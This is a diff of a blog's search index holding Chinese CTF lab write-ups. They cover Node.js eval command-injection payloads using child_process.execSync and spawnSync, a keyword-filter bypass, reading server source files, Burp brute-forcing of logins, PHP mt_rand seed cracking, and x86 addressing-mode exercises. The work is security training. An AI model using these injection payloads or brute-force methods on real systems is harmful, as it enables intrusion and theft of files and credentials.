@@ -251,6 +251,42 @@ header: Token的类型(即 JWT)和所使用的签名算法(如 HMAC SHA256或 RS
       </tags>
   </entry>
   <entry>
+    <title>nodejs</title>
+    <url>/2025/03/16/nodejs/</url>
+    <content><![CDATA[<h1>nodejs</h1>
+<p>简单来说就是一种新的语言，其中有一些可以执行shell的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调起shell的几种方式介绍（不限于这几种）</span><br><span class="line"></span><br><span class="line">1. child_process：node的一个子进程api，可创建一个子进程用于执行命令行</span><br><span class="line"></span><br><span class="line">2. shelljs：基于node的api封装的一个shell执行插件</span><br><span class="line"></span><br><span class="line">3. simple-git：基于node的ap封装的一个git命令执行插件</span><br></pre></td></tr></table></figure>
+<p>child_process模块，他下面有这些方法。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">require</span>(<span class="params"><span class="string">&#x27;child_process&#x27;</span></span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面的三个可以直接利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execSync</span><br><span class="line">exrcFileSync</span><br><span class="line">spawnSync</span><br></pre></td></tr></table></figure>
+<h1>web335</h1>
+<p>在网页源码当中看到需要传入的参数?eval=</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;).toString()</span><br><span class="line">    require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;f*&#x27;]).stdout.toString()</span><br><span class="line"> </span><br><span class="line">    execFileSync只能执行ls之类，他cat不了文件，后续有可以cat的操作</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;) 这里突然发现不用toString也行</span><br></pre></td></tr></table></figure>
+<p>这里使用的是js的shell</p>
+<p><img src="image-20250309184643785.png" alt="image-20250309184643785"></p>
+<p><a href="https://blog.csdn.net/m0_64815693/article/details/130076401">https://blog.csdn.net/m0_64815693/article/details/130076401</a></p>
+<p>使用require加载child_process模块</p>
+<p>然后调用child_process当中的execSync</p>
+<p>最后加的toString来</p>
+<p><code>execSync</code> 返回的是 <strong>Buffer</strong>，如果不转换，你拿到的是二进制数据，而不是字符串</p>
+<p>buffer</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf); <span class="comment">// &lt;Buffer 48 65 6c 6c 6f&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>stdout</code> 代表 <strong>标准输出</strong>（Standard Output），即 <code>spawnSync</code> 运行命令后返回的数据输出</p>
+<h1>web336</h1>
+<p>过滤了exec</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;tac&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取文件</span><br><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">require(&#x27;child_process&#x27;)[&#x27;e&#x27;%2b&#x27;xecSync&#x27;](&#x27;cat f*&#x27;).toString()</span><br></pre></td></tr></table></figure>
+<p>方法三：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//列出当前目录下的文件</span><br><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;./&#x27;)</span><br><span class="line">payload:</span><br><span class="line">    require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>nodejs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>phpCVE</title>
     <url>/2025/03/05/phpCVE/</url>
     <content><![CDATA[<h1>web311</h1>
@@ -311,42 +347,6 @@ header: Token的类型(即 JWT)和所使用的签名算法(如 HMAC SHA256或 RS
 ]]></content>
       <tags>
         <tag>phpCVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nodejs</title>
-    <url>/2025/03/16/nodejs/</url>
-    <content><![CDATA[<h1>nodejs</h1>
-<p>简单来说就是一种新的语言，其中有一些可以执行shell的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调起shell的几种方式介绍（不限于这几种）</span><br><span class="line"></span><br><span class="line">1. child_process：node的一个子进程api，可创建一个子进程用于执行命令行</span><br><span class="line"></span><br><span class="line">2. shelljs：基于node的api封装的一个shell执行插件</span><br><span class="line"></span><br><span class="line">3. simple-git：基于node的ap封装的一个git命令执行插件</span><br></pre></td></tr></table></figure>
-<p>child_process模块，他下面有这些方法。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">require</span>(<span class="params"><span class="string">&#x27;child_process&#x27;</span></span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>下面的三个可以直接利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execSync</span><br><span class="line">exrcFileSync</span><br><span class="line">spawnSync</span><br></pre></td></tr></table></figure>
-<h1>web335</h1>
-<p>在网页源码当中看到需要传入的参数?eval=</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;).toString()</span><br><span class="line">    require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;f*&#x27;]).stdout.toString()</span><br><span class="line"> </span><br><span class="line">    execFileSync只能执行ls之类，他cat不了文件，后续有可以cat的操作</span><br><span class="line">    require(&#x27;child_process&#x27;).execSync(&#x27;cat f*&#x27;) 这里突然发现不用toString也行</span><br></pre></td></tr></table></figure>
-<p>这里使用的是js的shell</p>
-<p><img src="image-20250309184643785.png" alt="image-20250309184643785"></p>
-<p><a href="https://blog.csdn.net/m0_64815693/article/details/130076401">https://blog.csdn.net/m0_64815693/article/details/130076401</a></p>
-<p>使用require加载child_process模块</p>
-<p>然后调用child_process当中的execSync</p>
-<p>最后加的toString来</p>
-<p><code>execSync</code> 返回的是 <strong>Buffer</strong>，如果不转换，你拿到的是二进制数据，而不是字符串</p>
-<p>buffer</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf); <span class="comment">// &lt;Buffer 48 65 6c 6c 6f&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>stdout</code> 代表 <strong>标准输出</strong>（Standard Output），即 <code>spawnSync</code> 运行命令后返回的数据输出</p>
-<h1>web336</h1>
-<p>过滤了exec</p>
-<p>方法一：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;tac&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取文件</span><br><span class="line">require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">require(&#x27;child_process&#x27;)[&#x27;e&#x27;%2b&#x27;xecSync&#x27;](&#x27;cat f*&#x27;).toString()</span><br></pre></td></tr></table></figure>
-<p>方法三：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//列出当前目录下的文件</span><br><span class="line">require(&#x27;fs&#x27;).readdirSync(&#x27;./&#x27;)</span><br><span class="line">payload:</span><br><span class="line">    require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>nodejs</tag>
       </tags>
   </entry>
   <entry>
@@ -1106,96 +1106,6 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
-    <title>pwn6-12</title>
-    <url>/2025/01/19/pwn6-12/</url>
-    <content><![CDATA[<h2 id="前置基础">前置基础</h2>
-<h3 id="pwn6-pwn12知识点">pwn6-pwn12知识点</h3>
-<p>数据的寻址方式:</p>
-<p>​	1 指令和数据的寻址方式</p>
-<p>​	2 数据寻址方式说明</p>
-<p>​	3 立即寻址</p>
-<p>​	4 直接寻址</p>
-<p>​	5 （存储器）间接寻址</p>
-<p>​	6 寄存器寻址</p>
-<p>​	7 寄存器间接寻址</p>
-<p>​	8 相对地址</p>
-<p>​	9 相对基址寻址</p>
-<p>​	10 相对变址寻址</p>
-<p>​	11 相对基址变址寻址</p>
-<p><strong>寄存器间接寻址</strong></p>
-<p><strong>格式：[寄存器]</strong></p>
-<p>说明：指令中指定一个寄存器，该寄存器中存放的是操作数的有效地址，通过访问该寄存器所指向的内存单元来获取操作数。例如在 8086 汇编语言中，MOV AX,[BX]，这里BX寄存器中存放的是一个内存地址，将该地址中的数据传送到AX寄存器中。</p>
-<p><strong>基址寻址</strong></p>
-<p><strong>格式：[基址寄存器 + 位移量]</strong></p>
-<p>说明：以一个基址寄存器的内容为基准地址，再加上一个位移量来形成操作数的有效地址。如MOV AX,[BX + 10H]，BX是基址寄存器，10H是位移量，将BX寄存器中的值加上10H得到的地址中的数据传送到AX寄存器。</p>
-<p><strong>变址寻址</strong></p>
-<p><strong>格式：[变址寄存器 + 位移量]</strong></p>
-<p>说明：与基址寻址类似，但使用变址寄存器来提供地址偏移量。例如MOV AX,[SI + 20H]，SI是变址寄存器，20H是位移量，把SI寄存器中的值加上20H所指向的内存单元中的数据传送到AX寄存器。</p>
-<p><strong>基址变址寻址</strong></p>
-<p><strong>格式：[基址寄存器 + 变址寄存器] 或 [基址寄存器 + 变址寄存器 + 位移量]</strong></p>
-<p>说明：将基址寄存器和变址寄存器的内容相加，再加上可选的位移量来形成操作数的有效地址。例如在 8086 中MOV AX,[BX + SI] 或者MOV AX,[BX + SI + 30H]，通过这种方式可以更灵活地访问二维数组等数据结构。</p>
-<p><strong>相对寻址</strong></p>
-<p><strong>格式：[程序计数器 (PC) + 位移量]</strong></p>
-<p>说明：以程序计数器当前的值为基准，加上一个位移量来形成转移目标地址。常用于程序的分支跳转指令，如JMP 10H[PC]，表示跳转到当前程序计数器的值加上10H后的地址处继续执行程序。</p>
-<p><strong>间接间接寻址</strong></p>
-<p><strong>格式：[[寄存器]]</strong></p>
-<p>说明：先访问指令中指定的寄存器，该寄存器中存放的是另一个内存单元的地址，再通过这个地址去访问最终的操作数。例如MOV AX,[[BX]]，先取BX寄存器中的值作为一个地址，再取该地址中的值作为最终操作数的地址，将该最终地址中的数据传送到AX寄存器。</p>
-<h3 id="pwn5">pwn5</h3>
-<p>题目信息：立即寻址方式结束后eax寄存器的值为？</p>
-<p><img src="image-20250113120703387.png" alt="image-20250113120703387"></p>
-<p>打开之后，没错，就是这个界面，刚开始的时候我以为这是我ida开错了</p>
-<img src="image-20250113120727880.png" alt="image-20250113120727880">
-<p>eax\ebx\ecx\edx都在这里</p>
-<p>我们需要eax</p>
-<p><img src="image-20250113120828151.png" alt="image-20250113120828151"></p>
-<p>mov是移动的意思，这里指eax=0Bh（h是十进制的意思）</p>
-<p>Add就是加的意思eax+=1BF48h</p>
-<p>sub是subtract（减）的缩写</p>
-<p>所以最终的eax=B+BF48-1=114514</p>
-<p>Ctfshow{114514}</p>
-<h3 id="pwn7">pwn7</h3>
-<p>题目信息:寄存器寻址方式结束后edx寄存器的值为？</p>
-<p><img src="image-20250113121038920.png" alt="image-20250113121038920"></p>
-<p>Ebx=36D</p>
-<p>Edx=ebx</p>
-<p>综上edx=36D</p>
-<p>注意大小写</p>
-<h3 id="pwn8">pwn8</h3>
-<p>题目信息:直接寻址方式结束后ecx寄存器的值为？</p>
-<p><img src="image-20250113121123869.png" alt="image-20250113121123869"></p>
-<p>Ecx=dword_80490E8</p>
-<p>dword_80490E8的地址是0x80490E8(双击跟进dword_80490E8)</p>
-<p><img src="wps1.jpg" alt="img"></p>
-<p>也就说把dword_80490E8的地址0x80490E8赋值给了ecx</p>
-<p>{0x80490E8}</p>
-<h3 id="pwn9">pwn9</h3>
-<p>题目信息:寄存器间接寻址方式结束后eax寄存器的值为？</p>
-<p><img src="wps2.jpg" alt="img"></p>
-<p>括号[]的意思是将esi所指向的地址的值赋值给eax</p>
-<p>Esi, offset dword_80490E8的意思是将msg(massage,这里是指dword_8090E8)的地址赋值给esi</p>
-<p>那么值为什么呢？双击！跟进</p>
-<p><img src="wps3.jpg" alt="img"></p>
-<p>{0x636C6557}</p>
-<h3 id="pwn10">pwn10</h3>
-<p>题目信息:寄存器相对寻址方式结束后eax寄存器的值为？</p>
-<p><img src="wps4.jpg" alt="img"></p>
-<p>最终eax=[0x80490E8+4]=[0x80490EC]=ome_to_CTFshow_PWN</p>
-<p><img src="wps5.jpg" alt="img"></p>
-<h3 id="pwn11">pwn11</h3>
-<p>题目信息:基址变址寻址方式结束后的eax寄存器的值为？</p>
-<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
-<p><img src="wps6.jpg" alt="img"></p>
-<p>Eax=[0x80490E8+2*2]=[80490EC]=ome_to_CTFshow_PWN</p>
-<h3 id="pwn12">pwn12</h3>
-<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
-<p><img src="wps7.jpg" alt="img"></p>
-<p>Eax=[0x80490E8+1+8*2-6]=[80490EC]=ome_to_CTFshow_PWN</p>
-]]></content>
-      <tags>
-        <tag>ctfshow_pwn_前置基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2025/02/05/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1>一</h1>
@@ -1418,6 +1328,96 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
+    <title>pwn6-12</title>
+    <url>/2025/01/19/pwn6-12/</url>
+    <content><![CDATA[<h2 id="前置基础">前置基础</h2>
+<h3 id="pwn6-pwn12知识点">pwn6-pwn12知识点</h3>
+<p>数据的寻址方式:</p>
+<p>​	1 指令和数据的寻址方式</p>
+<p>​	2 数据寻址方式说明</p>
+<p>​	3 立即寻址</p>
+<p>​	4 直接寻址</p>
+<p>​	5 （存储器）间接寻址</p>
+<p>​	6 寄存器寻址</p>
+<p>​	7 寄存器间接寻址</p>
+<p>​	8 相对地址</p>
+<p>​	9 相对基址寻址</p>
+<p>​	10 相对变址寻址</p>
+<p>​	11 相对基址变址寻址</p>
+<p><strong>寄存器间接寻址</strong></p>
+<p><strong>格式：[寄存器]</strong></p>
+<p>说明：指令中指定一个寄存器，该寄存器中存放的是操作数的有效地址，通过访问该寄存器所指向的内存单元来获取操作数。例如在 8086 汇编语言中，MOV AX,[BX]，这里BX寄存器中存放的是一个内存地址，将该地址中的数据传送到AX寄存器中。</p>
+<p><strong>基址寻址</strong></p>
+<p><strong>格式：[基址寄存器 + 位移量]</strong></p>
+<p>说明：以一个基址寄存器的内容为基准地址，再加上一个位移量来形成操作数的有效地址。如MOV AX,[BX + 10H]，BX是基址寄存器，10H是位移量，将BX寄存器中的值加上10H得到的地址中的数据传送到AX寄存器。</p>
+<p><strong>变址寻址</strong></p>
+<p><strong>格式：[变址寄存器 + 位移量]</strong></p>
+<p>说明：与基址寻址类似，但使用变址寄存器来提供地址偏移量。例如MOV AX,[SI + 20H]，SI是变址寄存器，20H是位移量，把SI寄存器中的值加上20H所指向的内存单元中的数据传送到AX寄存器。</p>
+<p><strong>基址变址寻址</strong></p>
+<p><strong>格式：[基址寄存器 + 变址寄存器] 或 [基址寄存器 + 变址寄存器 + 位移量]</strong></p>
+<p>说明：将基址寄存器和变址寄存器的内容相加，再加上可选的位移量来形成操作数的有效地址。例如在 8086 中MOV AX,[BX + SI] 或者MOV AX,[BX + SI + 30H]，通过这种方式可以更灵活地访问二维数组等数据结构。</p>
+<p><strong>相对寻址</strong></p>
+<p><strong>格式：[程序计数器 (PC) + 位移量]</strong></p>
+<p>说明：以程序计数器当前的值为基准，加上一个位移量来形成转移目标地址。常用于程序的分支跳转指令，如JMP 10H[PC]，表示跳转到当前程序计数器的值加上10H后的地址处继续执行程序。</p>
+<p><strong>间接间接寻址</strong></p>
+<p><strong>格式：[[寄存器]]</strong></p>
+<p>说明：先访问指令中指定的寄存器，该寄存器中存放的是另一个内存单元的地址，再通过这个地址去访问最终的操作数。例如MOV AX,[[BX]]，先取BX寄存器中的值作为一个地址，再取该地址中的值作为最终操作数的地址，将该最终地址中的数据传送到AX寄存器。</p>
+<h3 id="pwn5">pwn5</h3>
+<p>题目信息：立即寻址方式结束后eax寄存器的值为？</p>
+<p><img src="image-20250113120703387.png" alt="image-20250113120703387"></p>
+<p>打开之后，没错，就是这个界面，刚开始的时候我以为这是我ida开错了</p>
+<img src="image-20250113120727880.png" alt="image-20250113120727880">
+<p>eax\ebx\ecx\edx都在这里</p>
+<p>我们需要eax</p>
+<p><img src="image-20250113120828151.png" alt="image-20250113120828151"></p>
+<p>mov是移动的意思，这里指eax=0Bh（h是十进制的意思）</p>
+<p>Add就是加的意思eax+=1BF48h</p>
+<p>sub是subtract（减）的缩写</p>
+<p>所以最终的eax=B+BF48-1=114514</p>
+<p>Ctfshow{114514}</p>
+<h3 id="pwn7">pwn7</h3>
+<p>题目信息:寄存器寻址方式结束后edx寄存器的值为？</p>
+<p><img src="image-20250113121038920.png" alt="image-20250113121038920"></p>
+<p>Ebx=36D</p>
+<p>Edx=ebx</p>
+<p>综上edx=36D</p>
+<p>注意大小写</p>
+<h3 id="pwn8">pwn8</h3>
+<p>题目信息:直接寻址方式结束后ecx寄存器的值为？</p>
+<p><img src="image-20250113121123869.png" alt="image-20250113121123869"></p>
+<p>Ecx=dword_80490E8</p>
+<p>dword_80490E8的地址是0x80490E8(双击跟进dword_80490E8)</p>
+<p><img src="wps1.jpg" alt="img"></p>
+<p>也就说把dword_80490E8的地址0x80490E8赋值给了ecx</p>
+<p>{0x80490E8}</p>
+<h3 id="pwn9">pwn9</h3>
+<p>题目信息:寄存器间接寻址方式结束后eax寄存器的值为？</p>
+<p><img src="wps2.jpg" alt="img"></p>
+<p>括号[]的意思是将esi所指向的地址的值赋值给eax</p>
+<p>Esi, offset dword_80490E8的意思是将msg(massage,这里是指dword_8090E8)的地址赋值给esi</p>
+<p>那么值为什么呢？双击！跟进</p>
+<p><img src="wps3.jpg" alt="img"></p>
+<p>{0x636C6557}</p>
+<h3 id="pwn10">pwn10</h3>
+<p>题目信息:寄存器相对寻址方式结束后eax寄存器的值为？</p>
+<p><img src="wps4.jpg" alt="img"></p>
+<p>最终eax=[0x80490E8+4]=[0x80490EC]=ome_to_CTFshow_PWN</p>
+<p><img src="wps5.jpg" alt="img"></p>
+<h3 id="pwn11">pwn11</h3>
+<p>题目信息:基址变址寻址方式结束后的eax寄存器的值为？</p>
+<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
+<p><img src="wps6.jpg" alt="img"></p>
+<p>Eax=[0x80490E8+2*2]=[80490EC]=ome_to_CTFshow_PWN</p>
+<h3 id="pwn12">pwn12</h3>
+<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
+<p><img src="wps7.jpg" alt="img"></p>
+<p>Eax=[0x80490E8+1+8*2-6]=[80490EC]=ome_to_CTFshow_PWN</p>
+]]></content>
+      <tags>
+        <tag>ctfshow_pwn_前置基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/2025/04/02/ssrf/</url>
     <content><![CDATA[<h1>0x01 基础知识</h1>
@@ -1636,11 +1636,6 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
-    <title>test</title>
-    <url>/2025/04/14/test/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>web12-20</title>
     <url>/2025/01/19/web12-20/</url>
     <content><![CDATA[<h1>Web12</h1>
@@ -1718,247 +1713,10 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
-    <title>web21-30</title>
-    <url>/2025/01/19/web21-30/</url>
-    <content><![CDATA[<h1><strong>Web21</strong></h1>
-<p>有一点真麻烦</p>
-<img src="image-20250119202523975.png" alt="image-20250119202523975" style="zoom:25%;">
-<p>Bp抓包</p>
-<p>发送给intruder</p>
-<p>添加账号密码哪里</p>
-<p><img src="wps12.jpg" alt="img"></p>
-<p>用自定义迭代器(Custom Iterator)</p>
-<p>payload配置当中</p>
-<p>位置1添加admin</p>
-<p><img src="wps13.jpg" alt="img"></p>
-<p>位置2添加英文冒号</p>
-<p><img src="wps14.jpg" alt="img"></p>
-<p>位置3添加下载的附件</p>
-<p><img src="wps15.jpg" alt="img"></p>
-<p>Payload处理当中选择</p>
-<p><img src="wps16.jpg" alt="img"></p>
-<p>对我们添加的东西进行base64加密</p>
-<p>关闭对勾</p>
-<p><img src="wps17.jpg" alt="img"></p>
-<p>开始破解</p>
-<p>点击状态码</p>
-<p><img src="wps18.jpg" alt="img"></p>
-<p>第一个就是账号和密码</p>
-<p>解码出来是</p>
-<p><img src="wps19.jpg" alt="img"></p>
-<p>admin:shark63</p>
-<p>ctfshow{fb4fe60a-bc16-4982-92df-439262c04233}</p>
-<h1><strong>Web22</strong></h1>
-<p>没有靶机，自行wp</p>
-<h1><strong>Web23</strong></h1>
-<p><img src="wps20.jpg" alt="img"></p>
-<p>根据源码可知，需要token为特定的值才可以得到flag</p>
-<p>Token里面应该是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</p>
-<p>当中任意的几个的结合体</p>
-<p>Wp里面假设了三个，php脚本为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">print (strlen($string).&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for ($a = 0; $a &lt; 62; $a++) &#123;</span><br><span class="line"></span><br><span class="line">  for ($b = 0; $b &lt; 62; $b++) &#123;</span><br><span class="line"></span><br><span class="line">​    for ($c = 0; $c &lt; 62; $c++) &#123;</span><br><span class="line"></span><br><span class="line">​      $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line"></span><br><span class="line">​      $token = md5($flag);</span><br><span class="line"></span><br><span class="line">​      if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) &#123;</span><br><span class="line"></span><br><span class="line">​        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) &#123;</span><br><span class="line"></span><br><span class="line">​          echo $flag . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>答案有很多个a6e就是其中一个</p>
-<p>但是也可以是2位的token</p>
-<p>使用bp暴力破解出现3j</p>
-<p><img src="wps21.jpg" alt="img"></p>
-<p>这里要点击length</p>
-<p><img src="wps22.jpg" alt="img"></p>
-<p>同理用bp破解三位数也一样，但是四位数就比较耗费时间了，毕竟是暴力破解嘛</p>
-<p><img src="wps23.jpg" alt="img"></p>
-<p>ctfshow{83a47257-9025-4ea9-acb8-f7d5cbe4d541}</p>
-<h1><strong>Web24</strong></h1>
-<p>知识：伪随机数</p>
-<p>我们先了解一下怎样生成随机数</p>
-<?php
-
-  echo intval(mt_rand());
-
-?>
-<p>Intval()函数，将浮点数、布尔值转化为整数或0、1</p>
-<p>mt_rand()函数，会根据系统时间或者其他东西来产生随机数</p>
-<p>在本题中出现了mt_srand()函数mt_srand(372619038);</p>
-<p>其中的数字是seed种子，一旦使用了此函数，在之后的mt_rand()函数将基于该种子生成随机数，如果这里的种子不变，那么生成的随机数也会固定不变（因为生成随机数的算法不会变）</p>
-<p>那么我们通过运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">  mt_srand(372619038);</span><br><span class="line"></span><br><span class="line">  echo intval(mt_rand());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到的数字1155388967就可以拿到flag</p>
-<p>ctfshow{dddab7e5-2562-455d-9156-17542fe2507a}</p>
-<h1><strong>Web25</strong></h1>
-<p>$rand = intval($r)-intval(mt_rand());</p>
-<p>当r=0时</p>
-<p>Rand=-448251818</p>
-<p>那么，mt_rand=448251818</p>
-<p>这里需要反推出seed，下载php_mt_seed，拖进去ubuntu。对了，还需要php的版本，我们抓包看看响应头  PHP/7.3.11</p>
-<p>在ubuntu运行脚本查看seed：928309670或者4126709391</p>
-<p>在这里面运行（后一个seed正确）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
-<p>得</p>
-<p>448251818</p>
-<p>614468087</p>
-<p>Url/r=448251818  cookie=token=614468087</p>
-<p>ctfshow{3944ae31-389f-4695-92fb-7791162db256}</p>
-<h1><strong>Web26</strong></h1>
-<p>进去之后是个下载的什么什么的东西</p>
-<p>还有账号密码，应该是破解密码的</p>
-<p>Bp抓包爆破7758521</p>
-<p>ctfshow{9a82e93f-9eea-4340-8754-e2a1559f75cf</p>
-<h1><strong>Web27</strong></h1>
-<p>点击录取名单，有一个表格，那就从第一个人下手</p>
-<p>高先伊621022********5237</p>
-<p>很明显，这里需要bp暴力破解，注意抓post包</p>
-<p>发送给intruder</p>
-<p><img src="wps24.jpg" alt="img"></p>
-<p><img src="wps25.jpg" alt="img"></p>
-<p><img src="wps26.jpg" alt="img"></p>
-<p>02015237</p>
-<p>621022199002015237</p>
-<p>ctfshow{45f62eec-3f98-4f37-a99e-2e564ac70f4f}</p>
-<h1><strong>Web28</strong></h1>
-<p>爆破目录</p>
-<p><img src="wps27.jpg" alt="img"></p>
-<p>换成集束炸弹模式，选中1 2，并把后面的2.txt删掉，右边1和2都从0到100，出来后点状态码，然后点响应就可以了</p>
-<p><img src="wps28.jpg" alt="img"></p>
-<p>ctfshow{d70041f1-624c-4a40-88ae-1a720cbb9e35}</p>
-<h1>Web29</h1>
-<p><img src="wps29.jpg" alt="img"></p>
-<p>解释代码：</p>
-<p>error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)，即不显示 PHP 运行过程中可能产生的错误信息。这样做可能是为了避免在某些情况下向用户暴露敏感信息，但在开发和调试阶段，通常不建议关闭错误报告，以便及时发现和解决问题。</p>
